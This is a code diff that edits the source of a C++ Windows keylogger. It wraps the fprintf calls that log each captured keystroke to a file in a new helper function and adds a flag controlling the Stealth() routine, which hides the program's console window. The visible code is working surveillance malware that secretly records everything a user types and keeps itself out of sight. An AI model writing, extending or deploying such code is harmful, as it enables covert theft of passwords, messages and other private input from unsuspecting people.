@@ -3,8 +3,11 @@
 
 #include <iostream>
 #include <ctime>
+#include <string>
 
-using namespace std; 
+using namespace std;
+
+const bool HIDDEN_WINDOW = true;
 
 int Save (int key_stroke, char *file, char *raw_file);
 void AddNewSection(char * file);
@@ -34,6 +37,12 @@ int main()
 	return 0;
 }
 
+template<typename T>
+void my_print(FILE *OUTPUT_FILE, string format, T value){
+	fprintf(OUTPUT_FILE, format.c_str(), value);
+	// cout << "\t\tvalue: " << value;
+}
+
 /* *********************************** */
 
 int Save (int key_stroke, char *file, char *raw_file)
@@ -44,56 +53,58 @@ int Save (int key_stroke, char *file, char *raw_file)
 	FILE *OUTPUT_FILE;
 	OUTPUT_FILE = fopen(file, "a+");
 
-	cout << key_stroke << endl;
+	cout <<"stoke: " << key_stroke;
 
 	if (key_stroke == 8){
-		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]"); 
+		my_print(OUTPUT_FILE, "%s", "[BACKSPACE]"); 
 	}
 	else if (key_stroke == 13){
-		fprintf(OUTPUT_FILE, "%s", "\n");
+		my_print(OUTPUT_FILE, "%s", "\n");
 	}
 	else if (key_stroke == 32){
-		fprintf(OUTPUT_FILE, "%s", " ");
+		my_print(OUTPUT_FILE, "%s", " ");
 	}
 	else if (key_stroke == VK_TAB) {
-		fprintf(OUTPUT_FILE, "%s", "[TAB]");
+		my_print(OUTPUT_FILE, "%s", "[TAB]");
 	}
 	else if (key_stroke == VK_SHIFT){
-		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
+		my_print(OUTPUT_FILE, "%s", "[SHIFT]");
 	}
 	else if (key_stroke == VK_CAPITAL){
-		fprintf(OUTPUT_FILE, "%s", "[CAPS]");
+		my_print(OUTPUT_FILE, "%s", "[CAPS]");
 	}
 	else if (key_stroke == VK_CONTROL){
-		fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
+		my_print(OUTPUT_FILE, "%s", "[CONTROL]");
 	}
 	else if (key_stroke == VK_ESCAPE){
-		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
+		my_print(OUTPUT_FILE, "%s", "[ESCAPE]");
 	}
 	else if (key_stroke == VK_END){
-		fprintf(OUTPUT_FILE, "%s", "[END]");
+		my_print(OUTPUT_FILE, "%s", "[END]");
 	}
 	else if (key_stroke == VK_HOME){
-		fprintf(OUTPUT_FILE, "%s", "[HOME]");
+		my_print(OUTPUT_FILE, "%s", "[HOME]");
 	}
 	else if (key_stroke == VK_LEFT){
-		fprintf(OUTPUT_FILE, "%s", "[LEFT]");
+		my_print(OUTPUT_FILE, "%s", "[LEFT]");
 	}
 	else if (key_stroke == VK_UP){
-		fprintf(OUTPUT_FILE, "%s", "[UP]");
+		my_print(OUTPUT_FILE, "%s", "[UP]");
 	}
 	else if (key_stroke == VK_RIGHT){
-		fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
+		my_print(OUTPUT_FILE, "%s", "[RIGHT]");
 	}
 	else if (key_stroke == VK_DOWN){
-		fprintf(OUTPUT_FILE, "%s", "[DOWN]");
+		my_print(OUTPUT_FILE, "%s", "[DOWN]");
 	}
 	else if (key_stroke == 190 || key_stroke == 110){
-		fprintf(OUTPUT_FILE, "%s", ".");
+		my_print(OUTPUT_FILE, "%s", ".");
 	}
 	else{
-		fprintf(OUTPUT_FILE, "%c", (char)key_stroke);
+		my_print(OUTPUT_FILE, "%c", (char)key_stroke);
 	}
+
+	cout << endl;
 
 	fclose (OUTPUT_FILE);
 
@@ -130,5 +141,6 @@ void Stealth()
 	HWND Stealth;
 	AllocConsole();
 	Stealth = FindWindowA("ConsoleWindowClass", NULL);
-	ShowWindow(Stealth,0);
+	if(HIDDEN_WINDOW) ShowWindow(Stealth,0);
+	else ShowWindow(Stealth,1);
 }
